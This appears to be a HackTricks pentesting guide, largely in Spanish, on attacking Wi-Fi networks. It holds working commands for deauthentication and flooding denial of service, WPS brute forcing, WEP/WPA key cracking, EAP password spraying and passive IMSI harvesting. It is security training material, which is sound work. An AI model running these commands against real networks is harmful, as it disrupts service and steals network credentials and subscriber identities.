# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandos básicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Herramientas

### Hijacker & NexMon (Wi-Fi interno de Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ejecutar airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Desde: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Puede realizar ataques Evil Twin, KARMA y Known Beacons y luego usar una plantilla de phishing para conseguir obtener la password real de la red o capturar social network credentials.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta herramienta automatiza ataques **WPS/WEP/WPA-PSK**. Automáticamente:

- Configura la interfaz en monitor mode
- Escanea posibles redes - y te permite seleccionar la(s) víctima(s)
- Si WEP - Lanza ataques WEP
- Si WPA-PSK
- Si WPS: Pixie dust attack and the bruteforce attack (ten cuidado: el ataque de brute-force puede tardar mucho). Observa que no intenta null PIN ni PINs generados/desde bases de datos.
- Intenta capturar el PMKID del AP para crackearlo
- Intenta deauthenticate clientes del AP para capturar un handshake
- Si PMKID o Handshake, intenta bruteforce usando top5000 passwords.

## Resumen de ataques

- **DoS**
- Deauthentication/disassociation -- Desconectar a todos (o un ESSID/Cliente específico)
- Random fake APs -- Ocultar redes, posible crash de scanners
- Overload AP -- Intentar matar el AP (generalmente no muy útil)
- WIDS -- Jugar con el IDS
- TKIP, EAPOL -- Algunos ataques específicos para DoS de ciertos APs
- **Cracking**
- Crack **WEP** (varias herramientas y métodos)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Útil para capturar credenciales de captive portal y/o realizar ataques LAN
- **WPA-PSK** Evil Twin -- Útil para ataques en la red si conoces la contraseña
- **WPA-MGT** -- Útil para capturar credenciales corporativas
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Útil para capturar credenciales de captive portal y/o realizar ataques LAN
- **+ WPA** -- Útil para capturar WPA handshakes

## Notas rápidas sobre redes Open / OWE

- **Passive capture** en SSIDs abiertos aún funciona con monitor mode y tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) realiza un intercambio de claves por estación (sin PSK), por lo que los frames en el aire están cifrados incluso en SSIDs "open". Al basarse en WPA3, también aplica **802.11w PMF**, que bloquea frames de deauth/disassoc falsificados.
- OWE **no autentica** a los que se unen: cualquiera puede asociarse, así que **verifica el aislamiento de clientes** en lugar de confiar en afirmaciones de marketing. Sin aislamiento, ARP spoofing o responder-style poisoning en la L2 local todavía funciona.
- **Evil Twin** sigue siendo factible en SSIDs open/OWE presentando una señal más fuerte; PMF solo elimina el atajo de deauth. Si las víctimas aceptan un certificado TLS forjado, se recupera el MitM completo sobre HTTP(S).
- El envenenamiento por broadcast en guest Wi‑Fi open fácilmente produce credenciales/hashes (LLMNR/NBT-NS/mDNS). Ver:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Descripción de** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, a prevalent method in Wi-Fi hacking, involve forging "management" frames to **desconectar a la fuerza dispositivos de una red**. Estos paquetes no cifrados engañan a los clientes haciéndoles creer que provienen de la red legítima, permitiendo a los atacantes capturar WPA handshakes con fines de cracking o interrumpir persistentemente las conexiones de red. Esta táctica, alarmante por su simplicidad, se usa ampliamente y tiene implicaciones significativas para la seguridad de la red.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 significa deauthentication
- 1 es el número de deauths a enviar (puedes enviar múltiples si lo deseas); 0 significa enviarlos continuamente
- -a 00:14:6C:7E:40:80 es la MAC address del access point
- -c 00:0F:B5:34:30:30 es la MAC address del client a deauthenticate; si esto se omite entonces se envía broadcast deauthentication (no siempre funciona)
- ath0 es la interface name

### Disassociation Packets

**Disassociation packets**, similares a los **deauthentication packets**, son un tipo de management frame usado en redes Wi-Fi. Estos paquetes sirven para cortar la conexión entre un device (como un laptop o smartphone) y un access point (AP).

La principal diferencia entre disassociation y deauthentication radica en sus escenarios de uso. Mientras que un AP emite **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, restart, or relocating, por lo que es necesario desconectar todos los nodos conectados.

**Este ataque puede realizarse con mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Más ataques DOS por mdk4**

**En** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envía beacon frames para mostrar fake APs a los clients. Esto a veces puede hacer que fallen network scanners e incluso drivers.
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Enviar tramas de autenticación a todos los Access Points (APs) accesibles dentro del alcance puede sobrecargar estos APs, especialmente cuando hay numerosos clients involucrados. Este tráfico intenso puede provocar inestabilidad del sistema, haciendo que algunos APs se congelen o incluso se reinicien.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica si un SSID se revela correctamente y confirma el alcance del AP. Esta técnica, junto con **bruteforcing hidden SSIDs** con o sin una wordlist, ayuda a identificar y acceder a redes ocultas.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Enviar paquetes aleatorios o duplicados a diferentes colas QoS puede activar Michael Countermeasures en **TKIP APs**, provocando el apagado del AP durante un minuto. Este método es una táctica de ataque **DoS** (Denial of Service) eficiente.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Inundar un AP con **EAPOL Start frames** crea **fake sessions**, sobrecargando el AP y bloqueando a los clientes legítimos. Alternativamente, inyectar **fake EAPOL Logoff messages** desconecta forzosamente a los clientes; ambos métodos interrumpen efectivamente el servicio de red.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataques para redes en malla IEEE 802.11s**

Varios ataques contra la gestión de enlaces y el enrutamiento en redes en malla.

**ATTACK MODE w: Confusión de WIDS**

Conectar clientes a múltiples WDS nodes o rogue APs puede manipular los sistemas de detección y prevención de intrusiones, creando confusión y posible abuso del sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODO DE ATAQUE f: Packet Fuzzer**

Un packet fuzzer con diversas fuentes de paquetes y un conjunto completo de modificadores para la manipulación de paquetes.

### **Airggedon**

_**Airgeddon**_ ofrece la mayoría de los ataques propuestos en los comentarios anteriores:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) simplifica el proceso de conectar dispositivos a un router, acelerando y facilitando la configuración en redes cifradas con **WPA** o **WPA2** Personal. No es eficaz frente a la seguridad WEP, que se compromete con facilidad. WPS emplea un PIN de 8 dígitos, validado en dos mitades, lo que lo hace susceptible a ataques de fuerza bruta debido a su número limitado de combinaciones (11,000 posibilidades).

### WPS Bruteforce

Hay 2 herramientas principales para realizar esta acción: Reaver y Bully.

- **Reaver** ha sido diseñado para ser un ataque robusto y práctico contra WPS, y ha sido probado contra una amplia variedad de puntos de acceso e implementaciones de WPS.
- **Bully** es una **nueva implementación** del ataque de fuerza bruta WPS, escrito en C. Tiene varias ventajas sobre el código original de reaver: menos dependencias, mejor rendimiento de memoria y cpu, manejo correcto de endianness, y un conjunto de opciones más robusto.

El ataque explota la **vulnerabilidad del WPS PIN**, en particular la exposición de los primeros cuatro dígitos y el papel del último dígito como checksum, facilitando el ataque de fuerza bruta. Sin embargo, las defensas contra ataques de fuerza bruta, como **blocking MAC addresses** de atacantes agresivos, exigen **MAC address rotation** para continuar el ataque.

Al obtener el WPS PIN con herramientas como Bully o Reaver, el atacante puede deducir el PSK de WPA/WPA2, asegurando **acceso persistente a la red**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Este enfoque refinado apunta a WPS PINs usando vulnerabilidades conocidas:

1. **PINs predescubiertos**: Utilizar una base de datos de PINs conocidos vinculados a fabricantes específicos conocidos por usar WPS PINs uniformes. Esta base de datos correlaciona los primeros tres octetos de las MAC-addresses con los PINs probables para esos fabricantes.
2. **Algoritmos de generación de PIN**: Aprovechar algoritmos como ComputePIN y EasyBox, que calculan WPS PINs basándose en la MAC-address del AP. El algoritmo Arcadyan además requiere un device ID, añadiendo una capa al proceso de generación del PIN.

### WPS Pixie Dust attack

**Dominique Bongard** descubrió una falla en algunos Access Points (APs) relacionada con la creación de códigos secretos, conocidos como **nonces** (**E-S1** y **E-S2**). Si estos nonces pueden ser averiguados, cracking del WPS PIN del AP se vuelve fácil. El AP revela el PIN dentro de un código especial (hash) para demostrar que es legítimo y no un AP falso (rogue). Estos nonces son esencialmente las "llaves" para abrir la "caja fuerte" que contiene el WPS PIN. Más sobre esto se puede encontrar [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

En términos simples, el problema es que algunos APs no usaban claves suficientemente aleatorias para cifrar el PIN durante el proceso de conexión. Esto hace que el PIN sea vulnerable a ser adivinado desde fuera de la red (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si no quieres cambiar el dispositivo a monitor mode, o `reaver` y `bully` tienen algún problema, puedes probar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta herramienta puede realizar un Pixie Dust attack sin tener que cambiar a monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Algunos sistemas mal diseñados incluso permiten que un **Null PIN** (un PIN vacío o inexistente) conceda acceso, lo cual es bastante inusual. La herramienta **Reaver** es capaz de probar esta vulnerabilidad, a diferencia de **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 te permiten probar **tu PIN personalizado** (si tienes alguno)
- 7 and 8 realizan el **Pixie Dust attack**
- 13 te permite probar el **NULL PIN**
- 11 and 12 **recuperarán los PINs relacionados con el AP seleccionado desde bases de datos disponibles** y **generarán** posibles **PINs** usando: ComputePIN, EasyBox y opcionalmente Arcadyan (recomendado, ¿por qué no?)
- 9 and 10 probarán **todos los PINs posibles**

## **WEP**

**Por qué falla**

- RC4 seed is just **IV (24 bits) + shared key**. The IV is cleartext, tiny (2^24), and repeats quickly, so ciphertexts with the same IV reuse the keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) let you “vote” key bytes. **PTW** optimises this using ARP traffic to drop requirements to tens of thousands of packets instead of millions.
- Integrity is only **CRC32** (linear/unkeyed), so an attacker can flip bits and recompute CRC32 without the key → packet forgery/replay/ARP injection while waiting for IVs.

Practical break is deterministic:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon still ships an "All-in-One" WEP workflow if you prefer a guided UI.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) un nuevo método de ataque, único porque solo necesita **un único paquete** y no requiere que haya clientes conectados al AP objetivo—solo interacción entre el atacante y el AP.

Muchos routers modernos añaden un **campo opcional** a la **primera trama EAPOL** durante la asociación, conocido como `Robust Security Network`. Esto incluye el `PMKID`.

Como explica la publicación original, el **PMKID** se crea usando datos conocidos:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que el "PMK Name" es constante, conocemos el BSSID del AP y la station, y el `PMK` es idéntico al de un full 4-way handshake, **hashcat** puede usar esta información para crackear el PSK y recuperar la passphrase!

Para **recopilar** esta información y **bruteforce** localmente la contraseña puedes hacer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Los **PMKIDs captured** se mostrarán en la **console** y también se **saved** dentro de \_ **/tmp/attack.pcap**\_\
Ahora, convierte la captura al formato **hashcat/john** y crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Tenga en cuenta que el formato de un hash correcto contiene **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si el suyo **solo** contiene **3 partes**, entonces es **inválido** (la captura PMKID no fue válida).

Tenga en cuenta que `hcxdumptool` **también captura handshakes** (algo como esto aparecerá: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Puede **transformar** los **handshakes** al formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Captura de handshake

Un ataque a redes **WPA/WPA2** puede ejecutarse capturando un **handshake** e intentando **crack** el **password** **offline**. Este proceso implica monitorizar la comunicación de una red específica y el **BSSID** en un **channel** particular. Aquí tienes una guía simplificada:

1. Identifica el **BSSID**, el **channel**, y un **connected client** de la red objetivo.
2. Usa `airodump-ng` para monitorizar el tráfico de la red en el channel y BSSID especificados, con la esperanza de capturar un handshake. El comando se verá así:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar la probabilidad de capturar un handshake, desconecta momentánemente al cliente de la red para forzar una reautenticación. Esto se puede hacer usando el comando `aireplay-ng`, que envía deauthentication packets al cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

Una vez que en el `airodump-ng` aparece información del handshake, esto significa que el handshake fue capturado y puedes dejar de escuchar:

![](<../../images/image (172) (1).png>)

Una vez que el handshake fue capturado puedes **crack**arlo con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Comprobar si handshake está en el archivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si esta herramienta encuentra un handshake incompleto de una ESSID antes del handshake completado, no detectará el válido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Adivinación en línea de PSK más rápida vía `wpa_supplicant` ctrl socket (sin clientes/PMKID)

Cuando no hay clientes presentes y el AP rechaza PMKID, puedes iterar PSKs en línea sin volver a crear supplicants:

- Parchea `wpa_supplicant.c` para forzar `dur = 0;` en la lógica de backoff por auth failure (alrededor de `ssid->auth_failures`), deshabilitando efectivamente el temporizador temporary-disable.
- Ejecuta un único daemon con un control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Controlarlo a través de la interfaz de control, reutilizando el mismo scan y network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Un pequeño bucle en Python que lee eventos de socket (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) puede probar ~100 intentos en ~5 minutos sin la sobrecarga de escaneo. Sigue siendo ruidoso y detectable, pero evita reinicios de proceso por intento y los retrasos de backoff.

## **WPA Enterprise (MGT)**

En **entornos WiFi empresariales, encontrarás varios métodos de autenticación**, cada uno proporcionando diferentes niveles de seguridad y funciones de gestión. Cuando uses herramientas como `airodump-ng` para inspeccionar el tráfico de red, podrías notar identificadores de estos tipos de autenticación. Algunos métodos comunes incluyen:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Este método soporta hardware tokens y one-time passwords dentro de EAP-PEAP. A diferencia de MSCHAPv2, no usa un peer challenge y envía las contraseñas en plaintext al access point, lo que supone un riesgo para downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Implica enviar el hash MD5 de la contraseña desde el cliente. No es **recomendado** debido a su vulnerabilidad a ataques de diccionario, falta de autenticación del servidor y la incapacidad para generar claves WEP específicas por sesión.
3. **EAP-TLS (Transport Layer Security)**:
- Utiliza certificados tanto del cliente como del servidor para la autenticación y puede generar dinámicamente claves WEP basadas en el usuario y la sesión para asegurar las comunicaciones.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Proporciona autenticación mutua a través de un túnel cifrado, junto con un método para derivar claves WEP dinámicas por usuario y por sesión. Requiere solo certificados del servidor, mientras que los clientes usan credenciales.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funciona de forma similar a EAP creando un túnel TLS para comunicación protegida. Permite el uso de protocolos de autenticación más débiles encima de EAP gracias a la protección que ofrece el túnel.
- **PEAP-MSCHAPv2**: A menudo referido como PEAP, combina el vulnerable mecanismo challenge/response de MSCHAPv2 con un túnel TLS protector.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Similar a EAP-TLS pero inicia un túnel TLS antes de intercambiar certificados, ofreciendo una capa adicional de seguridad.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

Even using one of the most secure of authentication methods: **PEAP-EAP-TLS**, it is possible to **capture the username sent in the EAP protocol**. To do so, **capture a authentication communication** (start `airodump-ng` inside a channel and `wireshark` in the same interface) and filter the packets by`eapol`.\
Inside the "**Response, Identity**" packet, the **username** of the client will appear.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding is supported by both EAP-PEAP and EAP-TTLS. In the context of a WiFi network, an EAP-Identity request is typically initiated by the access point (AP) during the association process. To ensure the protection of user anonymity, the response from the EAP client on the user's device contains only the essential information required for the initial RADIUS server to process the request. This concept is illustrated through the following scenarios:

- EAP-Identity = anonymous
- In this scenario, all users employ the pseudonymous "anonymous" as their user identifier. The initial RADIUS server functions as either an EAP-PEAP or EAP-TTLS server, responsible for managing the server-side of the PEAP or TTLS protocol. The inner (protected) authentication method is then either handled locally or delegated to a remote (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- In this situation, users from different realms conceal their identities while indicating their respective realms. This allows the initial RADIUS server to proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms, which act as the PEAP or TTLS server. The initial RADIUS server operates solely as a RADIUS relay node.
- Alternatively, the initial RADIUS server may function as the EAP-PEAP or EAP-TTLS server and either handle the protected authentication method or forward it to another server. This option facilitates the configuration of distinct policies for various realms.

In EAP-PEAP, once the TLS tunnel is established between the PEAP server and the PEAP client, the PEAP server initiates an EAP-Identity request and transmits it through the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user's true identity through the encrypted tunnel. This approach effectively prevents the revelation of the user's actual identity to anyone eavesdropping on the 802.11 traffic.

EAP-TTLS follows a slightly different procedure. With EAP-TTLS, the client typically authenticates using PAP or CHAP, secured by the TLS tunnel. In this case, the client includes a User-Name attribute and either a Password or CHAP-Password attribute in the initial TLS message sent after tunnel establishment.

Regardless of the protocol chosen, the PEAP/TTLS server obtains knowledge of the user's true identity after the TLS tunnel has been established. The true identity can be represented as user@realm or simply user. If the PEAP/TTLS server is also responsible for authenticating the user, it now possesses the user's identity and proceeds with the authentication method protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user's home RADIUS server. This new RADIUS request omits the PEAP or TTLS protocol layer. In cases where the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user's true identity, replacing the anonymous User-Name from the incoming RADIUS request. When the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes extracted from the TLS payload are substituted in the outgoing RADIUS message, displacing the anonymous User-Name and TTLS EAP-Message attributes found in the incoming RADIUS request.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### EAP basado en SIM (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

La autenticación Wi‑Fi basada en SIM usando EAP‑SIM/EAP‑AKA sobre 802.1X puede leak el identificador permanente del suscriptor (IMSI) en cleartext durante la fase de identidad no autenticada si el despliegue no implementa pseudónimos/identidades protegidas o un túnel TLS alrededor del EAP interno.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Haz clic para expandir</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notas:
- Funciona antes de cualquier túnel TLS si la implementación usa EAP‑SIM/AKA en crudo sin identidad protegida/seudónimos.
- El valor expuesto es un identificador permanente vinculado a la SIM del abonado; su recolección permite el rastreo a largo plazo y abusos posteriores en telecomunicaciones.

Impacto
- Privacidad: rastreo persistente de usuarios/dispositivos a partir de capturas pasivas de Wi‑Fi en espacios públicos.
- Arranque de abusos en telecomunicaciones: con el IMSI, un atacante con acceso a SS7/Diameter puede consultar la ubicación o intentar la intercepción de llamadas/SMS y el robo de MFA.

Mitigaciones / qué buscar
- Verificar que los clientes usen identidades externas anónimas (seudónimos) para EAP‑SIM/AKA según la guía 3GPP (por ejemplo, 3GPP TS 33.402).
- Preferir tunelizar la fase de identidad (por ejemplo, EAP‑TTLS/PEAP que transporte internamente EAP‑SIM/AKA) para que el IMSI nunca se envíe en claro.
- Las capturas de paquetes de asociación/autenticación nunca deben revelar un IMSI en bruto en EAP-Response/Identity.

Relacionado: Explotación de señalización de telecomunicaciones con identificadores móviles capturados
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Si se espera que el cliente use un **nombre de usuario y contraseña** (ten en cuenta que **EAP-TLS** no será válido en este caso), entonces podrías intentar obtener una **lista** de **nombres de usuario** (ver la siguiente parte) y **contraseñas** y tratar de **bruteforce** el acceso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
También podrías realizar este ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoría de ataques al cliente

### Selección de red y roaming

- El protocolo 802.11 define cómo una estación se une a un Extended Service Set (ESS) pero no especifica los criterios para seleccionar un ESS o un access point (AP) dentro de él.
- Las estaciones pueden hacer roaming entre APs que comparten el mismo ESSID, manteniendo la conectividad a lo largo de un edificio o área.
- El protocolo requiere la autenticación de la estación al ESS pero no obliga al AP a autenticarse ante la estación.

### Listas de redes preferidas (PNLs)

- Las estaciones almacenan el ESSID de cada red inalámbrica a la que se conectan en su Lista de redes preferidas (PNL), junto con detalles de configuración específicos de la red.
- La PNL se usa para conectarse automáticamente a redes conocidas, mejorando la experiencia del usuario al agilizar el proceso de conexión.

### Escaneo pasivo

- Los APs transmiten periódicamente beacon frames, anunciando su presencia y características, incluyendo el ESSID del AP a menos que la difusión esté deshabilitada.
- Durante el escaneo pasivo, las estaciones escuchan beacon frames. Si el ESSID de un beacon coincide con una entrada en la PNL de la estación, la estación puede conectarse automáticamente a ese AP.
- El conocimiento de la PNL de un dispositivo permite una posible explotación al imitar el ESSID de una red conocida, engañando al dispositivo para que se conecte a un AP malicioso.

### Sondeo activo

- El sondeo activo implica que las estaciones envíen probe requests para descubrir APs cercanos y sus características.
- Directed probe requests tienen como objetivo un ESSID específico, ayudando a detectar si una red particular está dentro del alcance, incluso si es una red oculta.
- Los broadcast probe requests tienen un campo SSID nulo y se envían a todos los APs cercanos, permitiendo a la estación comprobar si hay alguna red preferida sin revelar el contenido de su PNL.

## AP simple con redirección a Internet

Antes de explicar cómo realizar ataques más complejos se va a explicar **cómo** simplemente **crear** un **AP** y **redirigir** su **tráfico** a una interfaz conectada **a** **Internet**.

Usando `ifconfig -a` verifica que la interfaz wlan para crear el AP y la interfaz conectada a Internet estén presentes.

### DHCP & DNS
```bash
